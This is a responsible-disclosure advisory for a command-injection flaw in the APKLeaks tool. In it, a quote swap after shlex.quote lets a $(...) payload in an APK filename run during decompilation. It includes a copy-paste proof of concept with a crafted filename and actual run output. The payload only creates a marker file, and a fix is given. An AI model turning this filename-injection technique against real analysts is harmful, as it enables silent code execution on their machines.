# APKLeaks: command injection via APK filename in `APKLeaks.decompile()` — full CLI reproduction

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2 Ubuntu 24.04 via the real `apkleaks` console script; output below is from the actual run)

- Affected component: `apkleaks/apkleaks.py`, `APKLeaks.decompile()` (quote-destroying replace at lines 96-98)
- Class: CWE-78 OS Command Injection
- Reproduction level: **full CLI** (the `apkleaks` console script from `[project.scripts]`), per maintainer request

## Reproduction conditions

- APKLeaks 2.6.3 (pip), Python 3.12, Ubuntu 24.04
- A `jadx` executable on PATH — every real APKLeaks deployment has one (it is the tool's decompiler); a no-op stub stands in for it here because the flaw is in apkleaks, not jadx
- The attacker controls only the **filename** of the APK the analyst runs the tool on (e.g. a sample dropped with a hostile name — analyzing hostile samples is the tool's core use case). Two constraints found during testing, both satisfiable by the attacker:
  - the filename cannot contain `/` (filesystem rule) → the payload uses `${IFS}` instead of spaces;
  - `integrity()` requires the payload file to be a genuine zip → the PoC APK is a valid zip containing `AndroidManifest.xml`.

## Description

`decompile()` builds the jadx command line with `shlex.quote` and then destroys the protection:

```python
args = [self.jadx, self.file, "-d", self.tempdir]
args.extend(re.split(r"\s|=", self.disarg))
comm = "%s" % (" ".join(quote(arg) for arg in args))
comm = comm.replace("\'", "\"")     # blanket single->double quote swap, line 97
os.system(comm)                     # POSIX sh: $(...) executes inside double quotes
```

`shlex.quote` wraps the attacker-controlled APK filename in **single** quotes, which neutralizes `$(...)`. The blanket `replace` on line 97 rewrites those single quotes to **double** quotes — and command substitution is *not* special-character-protected inside double quotes. The attacker-chosen filename is therefore evaluated by the shell during the decompile step of a normal run.

## Impact

Arbitrary command execution as the analyst, silently, during a normal successful CLI run — the reproduction completes with exit code 0 and the usual "Done" output while the injected command has already executed. An analyst triaging a hostile sample (the tool's exact purpose) is compromised by the sample's mere filename.

## PoC (copy-paste ready)

**Step 1 — jadx on PATH** (stand-in for a jadx-equipped machine; the flaw is in apkleaks):

```bash
mkdir -p bin && printf '#!/bin/sh\nexit 0\n' > bin/jadx && chmod +x bin/jadx
```

**Step 2 — attacker drop: a valid zip APK whose FILENAME carries the payload:**

```bash
python3 -c "import zipfile; zipfile.ZipFile('\$(touch\${IFS}apkleaks_pwned_CLI).apk','w').writestr('AndroidManifest.xml', b'placeholder')"
```

**Step 3 — analyst runs the CLI on the sample:**

```bash
PATH=$PWD/bin:$PATH apkleaks -f '$(touch${IFS}apkleaks_pwned_CLI).apk'
echo "exit code: $?"
ls apkleaks_pwned_CLI    # created by the injected command
```

Chain walked by the console script: `cli.main → APKLeaks(args) → integrity() (zip ok) → decompile() (injection) → scanning() → cleanup()`, exit 0.

## Execution result (actual run: APKLeaks 2.6.3 / Python 3.12 / Ubuntu 24.04)

```
=== Step 0: vulnerable source ===
96:  comm = "%s" % (" ".join(quote(arg) for arg in args))
97:  comm = comm.replace("\'","\"")
98:  os.system(comm)

=== Step 2: attacker drop — valid zip APK whose FILENAME carries the payload ===
-rw-r--r-- 1 iot iot 147 ... $(touch${IFS}apkleaks_pwned_CLI).apk
zip integrity (is_zipfile): True ['AndroidManifest.xml']

=== Step 3: analyst runs the CLI on the sample ===
exit code: 0
** Decompiling APK...
** Scanning against ''
** Done with nothing. ¯\_(ツ)_/¯

=== Step 4: verdict ===
RESULT: REPRODUCED - $(touch ...) executed during the decompile step, CLI exited normally
-rw-r--r-- 1 iot iot 0 ... apkleaks_pwned_CLI
```

The side-effect file exists after the run: the command substitution executed during the decompile step while the CLI completed normally (exit 0).

## Suggested fix

`subprocess.run(args_list, ...)` without a shell (first choice), or keep the `shlex.quote` output unmodified if a shell string is required for legacy reasons. The blanket quote-swap on line 97 must go.

## Disclosure status

Reported to the maintainer per SECURITY.md (private thread, CLI reproduction provided at their request).
